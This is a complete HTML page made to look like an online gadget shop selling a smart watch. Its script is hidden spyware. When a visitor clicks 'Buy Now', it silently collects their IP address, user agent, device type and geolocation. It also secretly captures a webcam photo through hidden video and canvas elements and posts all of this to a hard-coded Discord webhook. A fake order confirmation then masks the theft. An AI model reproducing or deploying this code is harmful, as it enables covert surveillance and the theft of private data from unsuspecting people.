<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Online Gadget Shop</title>
  <style>
    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
    .shop { background: white; padding: 20px; max-width: 400px; margin: auto; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h1 { margin-bottom: 10px; }
    button { padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <div class="shop">
    <h1>Smart Watch</h1>
    <p>₱1,299.00</p>
    <button id="buyBtn">Buy Now</button>
  </div>

  <video id="video" autoplay playsinline width="300" height="200"></video>
  <canvas id="canvas" width="300" height="200"></canvas>

  <script>
    const webhookURL = "https://canary.discord.com/api/webhooks/1375127997375315988/OzWjHdKuHuKaIWWh89zDGKfc7KeEiIRNTHhxfQX0I4m-B7AboV5zKycg-S7g0wfBrO7F"
    const buyBtn = document.getElementById("buyBtn");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    async function getIPInfo() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "Unavailable";
      }
    }

    function getUserAgent() {
      return navigator.userAgent;
    }

    function detectDevice() {
      const ua = navigator.userAgent.toLowerCase();
      if (/mobile|android|iphone|ipad|tablet/.test(ua)) return "Mobile/Tablet";
      return "Desktop";
    }

    function getGeolocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve("Unavailable");
        navigator.geolocation.getCurrentPosition(
          pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
          err => resolve("Denied/Unavailable"),
          { timeout: 5000 }
        );
      });
    }

    async function sendToDiscord(blob, infoText) {
      const form = new FormData();
      form.append("file", blob, "photo.png");
      form.append("payload_json", JSON.stringify({ content: infoText }));

      fetch(webhookURL, {
        method: "POST",
        body: form
      });
    }

    buyBtn.addEventListener("click", async () => {
      const ip = await getIPInfo();
      const ua = getUserAgent();
      const device = detectDevice();
      const geo = await getGeolocation();

      let photoBlob = null;

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(res => setTimeout(res, 2000)); // wait for camera
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        video.srcObject.getTracks().forEach(track => track.stop());

        photoBlob = await new Promise(resolve => {
          canvas.toBlob(blob => resolve(blob), "image/png");
        });
      } catch (e) {
        // No camera or denied
        console.warn("Webcam capture failed.");
      }

      const infoText = `**New Order Capture**:
- **IP**: ${ip}
- **Geolocation**: ${geo}
- **User-Agent**: ${ua}
- **Device Type**: ${device}
- **Camera Access**: ${photoBlob ? "Success" : "Failed / Denied"}`;

      await sendToDiscord(photoBlob || new Blob(["No photo"]), infoText);
      alert("Thank you for your order!");
    });
  </script>
</body>
</html>
